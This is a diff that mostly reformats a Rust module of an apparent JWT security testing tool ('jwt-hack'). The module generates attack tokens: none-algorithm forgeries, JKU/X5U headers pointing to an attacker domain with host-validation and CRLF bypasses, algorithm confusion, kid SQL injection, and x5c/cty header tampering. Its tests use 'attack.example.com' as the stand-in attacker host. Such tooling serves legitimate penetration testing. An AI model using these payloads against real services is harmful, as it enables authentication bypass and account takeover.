@@ -1,16 +1,25 @@
 use anyhow::Result;
 use base64::{engine::general_purpose, Engine as _};
+use colored::Colorize;
 use log::info;
 use serde_json::json;
-use colored::Colorize;
 use std::collections::HashSet;
 
 use crate::jwt;
 use crate::utils;
 
 /// Execute the payload command
-pub fn execute(token: &str, jwk_trust: Option<&str>, jwk_attack: Option<&str>, jwk_protocol: &str, target: Option<&str>) {
-    utils::log_info(format!("Generating attack payloads for token: {}", utils::format_jwt_token(token)));
+pub fn execute(
+    token: &str,
+    jwk_trust: Option<&str>,
+    jwk_attack: Option<&str>,
+    jwk_protocol: &str,
+    target: Option<&str>,
+) {
+    utils::log_info(format!(
+        "Generating attack payloads for token: {}",
+        utils::format_jwt_token(token)
+    ));
     if let Err(e) = generate_payloads(token, jwk_trust, jwk_attack, jwk_protocol, target) {
         utils::log_error(format!("Error generating payloads: {}", e));
         utils::log_error("e.g jwt-hack payload {JWT_CODE} --jwk-attack attack.example.com --jwk-trust trust.example.com --target none,jku,alg_confusion");
@@ -38,110 +47,147 @@ fn generate_payloads(
 
     // Parse target parameter
     let targets: HashSet<String> = match target {
-        Some(t) => t.split(',')
-            .map(|s| s.trim().to_lowercase())
-            .collect(),
-        None => HashSet::from(["all".to_string()])
+        Some(t) => t.split(',').map(|s| s.trim().to_lowercase()).collect(),
+        None => HashSet::from(["all".to_string()]),
     };
-    
+
     // Available target types
-    let valid_targets = ["all", "none", "jku", "x5u", "alg_confusion", "kid_sql", "x5c", "cty"];
+    let valid_targets = [
+        "all",
+        "none",
+        "jku",
+        "x5u",
+        "alg_confusion",
+        "kid_sql",
+        "x5c",
+        "cty",
+    ];
     for t in &targets {
         if !valid_targets.contains(&t.as_str()) && t != "all" {
-            utils::log_warning(format!("Unknown target type: '{}'. Valid types are: {}", t, valid_targets.join(", ")));
+            utils::log_warning(format!(
+                "Unknown target type: '{}'. Valid types are: {}",
+                t,
+                valid_targets.join(", ")
+            ));
         }
     }
-    
+
     let should_generate_all = targets.contains("all");
-    
+
     // Generate none algorithm payloads if requested
     if should_generate_all || targets.contains("none") {
         utils::log_info("Generating 'none' algorithm attack payloads");
         let spinner = utils::start_progress("Creating none algorithm variants...");
-        
+
         generate_none_payloads(claims_part, "none")?;
         generate_none_payloads(claims_part, "NonE")?;
         generate_none_payloads(claims_part, "NONE")?;
-        
+
         spinner.finish_and_clear();
     }
 
     // Generate URL payloads if attack domain is provided and if requested
     if let Some(attack_domain) = jwk_attack {
         if should_generate_all || targets.contains("jku") || targets.contains("x5u") {
-            utils::log_info(format!("Generating URL-based attack payloads using domain: {}", attack_domain.bright_yellow()));
+            utils::log_info(format!(
+                "Generating URL-based attack payloads using domain: {}",
+                attack_domain.bright_yellow()
+            ));
             let spinner = utils::start_progress("Creating JKU and X5U payloads...");
-            
-            generate_url_payloads(claims_part, jwk_trust, attack_domain, jwk_protocol, &targets, should_generate_all)?;
-            
+
+            generate_url_payloads(
+                claims_part,
+                jwk_trust,
+                attack_domain,
+                jwk_protocol,
+                &targets,
+                should_generate_all,
+            )?;
+
             spinner.finish_and_clear();
         }
     } else if should_generate_all || targets.contains("jku") || targets.contains("x5u") {
         utils::log_warning("No attack domain provided. Skipping URL-based payloads.");
         utils::log_info("To generate URL payloads, use --jwk-attack parameter.");
     }
-    
+
     // Generate algorithm confusion payloads if requested
     if should_generate_all || targets.contains("alg_confusion") {
         utils::log_info("Generating algorithm confusion attack payloads");
         let spinner = utils::start_progress("Creating algorithm confusion variants...");
-        
+
         if let Ok(payloads) = crate::payload::generate_alg_confusion_payload(token, None) {
             for payload in payloads {
-                println!("\n{}", "━━━ Algorithm Confusion Payload (RS256->HS256) ━━━".bright_cyan().bold());
+                println!(
+                    "\n{}",
+                    "━━━ Algorithm Confusion Payload (RS256->HS256) ━━━"
+                        .bright_cyan()
+                        .bold()
+                );
                 println!("{}", payload);
                 println!();
             }
         }
-        
+
         spinner.finish_and_clear();
     }
-    
+
     // Generate kid SQL injection payloads if requested
     if should_generate_all || targets.contains("kid_sql") {
         utils::log_info("Generating kid SQL injection attack payloads");
         let spinner = utils::start_progress("Creating kid SQL injection variants...");
-        
+
         if let Ok(payloads) = crate::payload::generate_kid_sql_payload(token) {
             for payload in payloads {
-                println!("\n{}", "━━━ kid SQL Injection Payload ━━━".bright_cyan().bold());
+                println!(
+                    "\n{}",
+                    "━━━ kid SQL Injection Payload ━━━".bright_cyan().bold()
+                );
                 println!("{}", payload);
                 println!();
             }
         }
-        
+
         spinner.finish_and_clear();
     }
-    
+
     // Generate x5c header injection payloads if requested
     if should_generate_all || targets.contains("x5c") {
         utils::log_info("Generating x5c header injection attack payloads");
         let spinner = utils::start_progress("Creating x5c header injection variants...");
-        
+
         if let Ok(payloads) = crate::payload::generate_x5c_payload(token) {
             for payload in payloads {
-                println!("\n{}", "━━━ x5c Header Injection Payload ━━━".bright_cyan().bold());
+                println!(
+                    "\n{}",
+                    "━━━ x5c Header Injection Payload ━━━".bright_cyan().bold()
+                );
                 println!("{}", payload);
                 println!();
             }
         }
-        
+
         spinner.finish_and_clear();
     }
-    
+
     // Generate cty header manipulation payloads if requested
     if should_generate_all || targets.contains("cty") {
         utils::log_info("Generating cty header manipulation attack payloads");
         let spinner = utils::start_progress("Creating cty header variants...");
-        
+
         if let Ok(payloads) = crate::payload::generate_cty_payload(token) {
             for payload in payloads {
-                println!("\n{}", "━━━ cty Header Manipulation Payload ━━━".bright_cyan().bold());
+                println!(
+                    "\n{}",
+                    "━━━ cty Header Manipulation Payload ━━━"
+                        .bright_cyan()
+                        .bold()
+                );
                 println!("{}", payload);
                 println!();
             }
         }
-        
+
         spinner.finish_and_clear();
     }
 
@@ -165,10 +211,17 @@ fn generate_none_payloads(claims: &str, alg_value: &str) -> Result<()> {
     let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
 
     // Format as JWT (without signature)
-    println!("\n{}", format!("━━━ None Algorithm Payload ({}) ━━━", alg_value).bright_cyan().bold());
-    println!("{}.{}", 
+    println!(
+        "\n{}",
+        format!("━━━ None Algorithm Payload ({}) ━━━", alg_value)
+            .bright_cyan()
+            .bold()
+    );
+    println!(
+        "{}.{}",
         encoded_header.bright_blue(),
-        claims.bright_magenta());
+        claims.bright_magenta()
+    );
     println!();
 
     Ok(())
@@ -183,15 +236,15 @@ fn generate_url_payloads(
     should_generate_all: bool,
 ) -> Result<()> {
     let mut jku_payloads = Vec::new();
-    
+
     if should_generate_all || targets.contains("jku") {
         jku_payloads.push(("jku", jwk_attack.to_string()));
     }
-    
+
     if should_generate_all || targets.contains("x5u") {
         jku_payloads.push(("x5u", jwk_attack.to_string()));
     }
-    
+
     if jku_payloads.is_empty() {
         return Ok(());
     }
@@ -211,10 +264,17 @@ fn generate_url_payloads(
         );
 
         let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-        println!("\n{}", format!("━━━ JKU/X5U Basic Payload ({}) ━━━", key_type).bright_cyan().bold());
-        println!("{}.{}", 
+        println!(
+            "\n{}",
+            format!("━━━ JKU/X5U Basic Payload ({}) ━━━", key_type)
+                .bright_cyan()
+                .bold()
+        );
+        println!(
+            "{}.{}",
             encoded_header.bright_blue(),
-            claims.bright_magenta());
+            claims.bright_magenta()
+        );
         println!();
 
         // If trust domain is provided, generate bypass payloads
@@ -234,10 +294,17 @@ fn generate_url_payloads(
             );
 
             let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-            println!("\n{}", format!("━━━ Z-Separator Bypass Payload ({}) ━━━", key_type).bright_cyan().bold());
-            println!("{}.{}", 
+            println!(
+                "\n{}",
+                format!("━━━ Z-Separator Bypass Payload ({}) ━━━", key_type)
+                    .bright_cyan()
+                    .bold()
+            );
+            println!(
+                "{}.{}",
                 encoded_header.bright_blue(),
-                claims.bright_magenta());
+                claims.bright_magenta()
+            );
             println!();
 
             // Bypass host validation - @ separator
@@ -255,10 +322,17 @@ fn generate_url_payloads(
             );
 
             let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-            println!("\n{}", format!("━━━ @-Separator Bypass Payload ({}) ━━━", key_type).bright_cyan().bold());
-            println!("{}.{}", 
+            println!(
+                "\n{}",
+                format!("━━━ @-Separator Bypass Payload ({}) ━━━", key_type)
+                    .bright_cyan()
+                    .bold()
+            );
+            println!(
+                "{}.{}",
                 encoded_header.bright_blue(),
-                claims.bright_magenta());
+                claims.bright_magenta()
+            );
             println!();
 
             // Host header injection with CRLF
@@ -279,10 +353,17 @@ fn generate_url_payloads(
             );
 
             let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-            println!("\n{}", format!("━━━ CRLF Injection Payload ({}) ━━━", key_type).bright_cyan().bold());
-            println!("{}.{}", 
+            println!(
+                "\n{}",
+                format!("━━━ CRLF Injection Payload ({}) ━━━", key_type)
+                    .bright_cyan()
+                    .bold()
+            );
+            println!(
+                "{}.{}",
                 encoded_header.bright_blue(),
-                claims.bright_magenta());
+                claims.bright_magenta()
+            );
             println!();
         }
     }
@@ -293,8 +374,8 @@ fn generate_url_payloads(
 #[cfg(test)]
 mod tests {
     use super::*;
-    use serde_json::json;
     use base64::engine::general_purpose;
+    use serde_json::json;
 
     fn create_test_token() -> String {
         // Create a simple header and payload
@@ -302,104 +383,113 @@ mod tests {
             "alg": "HS256",
             "typ": "JWT"
         });
-        
+
         let payload = json!({
             "sub": "1234567890",
             "name": "Test User",
             "iat": 1516239022
         });
-        
+
         // Encode to base64
-        let header_encoded = general_purpose::URL_SAFE_NO_PAD.encode(
-            header.to_string().as_bytes()
-        );
-        let payload_encoded = general_purpose::URL_SAFE_NO_PAD.encode(
-            payload.to_string().as_bytes()
-        );
-        
+        let header_encoded = general_purpose::URL_SAFE_NO_PAD.encode(header.to_string().as_bytes());
+        let payload_encoded =
+            general_purpose::URL_SAFE_NO_PAD.encode(payload.to_string().as_bytes());
+
         // Create a simple test token
         format!("{}.{}.signature", header_encoded, payload_encoded)
     }
-    
+
     #[test]
     fn test_execute_no_panic() {
         // Create a test token
         let token = create_test_token();
-        
+
         // Test with minimal parameters
         let result = std::panic::catch_unwind(|| {
             execute(&token, None, None, "https", None);
         });
-        
-        assert!(result.is_ok(), "execute() should not panic with minimal parameters");
+
+        assert!(
+            result.is_ok(),
+            "execute() should not panic with minimal parameters"
+        );
     }
-    
+
     #[test]
     fn test_execute_with_target_parameters() {
         // Create a test token
         let token = create_test_token();
-        
+
         // Test with specific target
         let result = std::panic::catch_unwind(|| {
             execute(&token, None, None, "https", Some("none"));
         });
-        
-        assert!(result.is_ok(), "execute() should not panic with 'none' target parameter");
+
+        assert!(
+            result.is_ok(),
+            "execute() should not panic with 'none' target parameter"
+        );
     }
-    
+
     #[test]
     fn test_execute_with_jwk_parameters() {
         // Create a test token
         let token = create_test_token();
-        
+
         // Test with JWK parameters
         let result = std::panic::catch_unwind(|| {
             execute(
-                &token, 
-                Some("trust.example.com"), 
-                Some("attack.example.com"), 
-                "https", 
-                Some("jku,x5u")
+                &token,
+                Some("trust.example.com"),
+                Some("attack.example.com"),
+                "https",
+                Some("jku,x5u"),
             );
         });
-        
-        assert!(result.is_ok(), "execute() should not panic with JWK parameters");
+
+        assert!(
+            result.is_ok(),
+            "execute() should not panic with JWK parameters"
+        );
     }
-    
+
     #[test]
     fn test_execute_with_invalid_token() {
         // Create an invalid token
         let token = "invalid.token";
-        
+
         // Test with invalid token
         let result = std::panic::catch_unwind(|| {
             execute(token, None, None, "https", None);
         });
-        
-        assert!(result.is_ok(), "execute() should not panic with invalid token");
+
+        assert!(
+            result.is_ok(),
+            "execute() should not panic with invalid token"
+        );
     }
-    
+
     #[test]
     fn test_generate_none_payloads() {
         // Create a valid payload part
         let payload_str = "eyJzdWIiOiIxMjM0NTY3ODkwIn0";
-        
+
         // Test generating none payload
         let result = generate_none_payloads(payload_str, "none");
-        
+
         assert!(result.is_ok(), "generate_none_payloads should not fail");
     }
-    
+
     #[test]
     fn test_generate_url_payloads() {
         // Create a valid payload part
         let payload_str = "eyJzdWIiOiIxMjM0NTY3ODkwIn0";
-        
+
         // Create a set of targets
         let mut targets = HashSet::new();
         targets.insert("jku".to_string());
         targets.insert("x5u".to_string());
-        
+
         // Test generating url payloads
         let result = generate_url_payloads(
             payload_str,
@@ -407,9 +497,9 @@ mod tests {
             "attack.example.com",
             "https",
             &targets,
-            false
+            false,
         );
-        
+
         assert!(result.is_ok(), "generate_url_payloads should not fail");
     }
 }
